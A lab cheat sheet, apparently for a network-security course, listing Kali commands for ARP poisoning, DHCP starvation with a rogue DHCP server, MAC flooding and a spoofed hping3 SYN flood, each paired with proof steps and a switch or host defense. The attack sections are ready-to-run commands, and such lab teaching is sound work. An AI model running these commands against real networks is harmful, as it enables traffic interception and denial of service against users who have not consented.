# 🔴 Attack Commands Reference (Kali)

> **Yersinia GUI note:** if `yersinia -G` says GTK isn't supported, use the
> interactive terminal mode `sudo yersinia -I` instead (same attacks), or the
> one-liners below. To get the GUI: `sudo apt install libgtk2.0-dev -y && sudo apt install --reinstall yersinia`.


> Lab use only. Run each attack, capture the proof, then apply the
> matching defense and re-run to show it blocked.

## Prep — IP forwarding (for stealthy MITM)

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
# verify
cat /proc/sys/net/ipv4/ip_forward      # → 1
```

---

## ATTACK 1 — ARP Poisoning / MITM

```bash
# Find targets
nmap -sn 192.168.X.0/24

# Ettercap (text mode, full MITM victim <-> gateway)
ettercap -T -i eth0 -M arp:remote /VICTIM_IP// /GATEWAY_IP//

# Alternative: arpspoof (two terminals for bidirectional)
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP
arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP

# Proof: on victim, gateway now maps to KALI's MAC
#   (Windows) arp -a
#   (Linux)   ip neigh
```

Defense: **Dynamic ARP Inspection (DAI)** + DHCP snooping.

---

## ATTACK 2 — DHCP Starvation + Rogue DHCP

> Run DHCP on a Cisco device (router/L3 switch) with a SMALL pool so it
> drains fast and you can watch it on `show ip dhcp binding`. Disable
> VMware's VMnet1 DHCP first so two servers don't fight.

```bash
# Starvation — dhcpstarv (most reliable)
sudo apt install dhcpstarv -y
sudo dhcpstarv -i eth0

# Starvation — yersinia interactive
sudo yersinia -I            # F2 (DHCP) -> x -> sending DISCOVER  (GUI often missing)
# Starvation — yersinia one-liner
sudo yersinia dhcp -attack 1 -interface eth0

# Rogue DHCP (hand out Kali as the gateway) via dnsmasq
sudo apt install dnsmasq -y
sudo dnsmasq -d -p0 --dhcp-range=192.168.81.50,192.168.81.150,12h \
  --dhcp-option=3,192.168.81.KALI --dhcp-option=6,192.168.81.KALI -i eth0
```

Proof (VMnet1 is the DHCP server — check the victims):
```
# A real VPC can't pull an IP (pool drained)  → release/renew fails
# A new client's gateway = Kali's IP           → MITM at scale
```

Defense: **DHCP Snooping** on SW1 (trust the cloud-facing port + rate limit).

---

## ATTACK 3 — MAC Flooding (CAM overflow)

```bash
# Flood the switch CAM table with random source MACs
macof -i eth0

# Optional: target a specific destination
macof -i eth0 -d VICTIM_IP

# Proof: in Wireshark you now see traffic between OTHER hosts
```

Defense: **Port Security** (max MACs + violation action).

---

## ATTACK 4 — SYN Flood (DoS)

```bash
# Classic SYN flood, spoofed sources, max rate
sudo hping3 -S --flood -V -p 80 --rand-source TARGET_IP

#  -S = SYN   --flood = max rate   -p = port   --rand-source = spoof IPs

# Variants
sudo hping3 -S --flood -p 80 TARGET_IP                       # single source
sudo hping3 -S --flood -p 80 --rand-source -d 120 TARGET_IP  # bigger packets
```

Proof (on the victim):
```
# Linux:   netstat -tn | grep SYN_RECV | wc -l   -> climbing fast
# Windows: netstat -n -p tcp | find "SYN_RECEIVED"
# The service stops answering legit clients (page times out)
```

Defense:
```
# Victim host — SYN cookies survive the flood
sudo sysctl -w net.ipv4.tcp_syncookies=1
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=2048
sudo sysctl -w net.ipv4.tcp_synack_retries=2

# Cisco — police the SYN-heavy traffic (CoPP-style policy-map + service-policy)
```

---

## Capture / Proof Tools

```bash
# Live capture during attacks
wireshark &

# Quick CLI capture
tcpdump -i eth0 -w capture.pcap

# Useful Wireshark filters
#   ip.addr == VICTIM_IP
#   arp
#   bootp           (DHCP)
```

---

## Cleanup After Each Attack

```bash
# Stop ettercap/arpspoof (Ctrl+C) — it restores ARP on exit
# Turn off forwarding when done
echo 0 > /proc/sys/net/ipv4/ip_forward
```
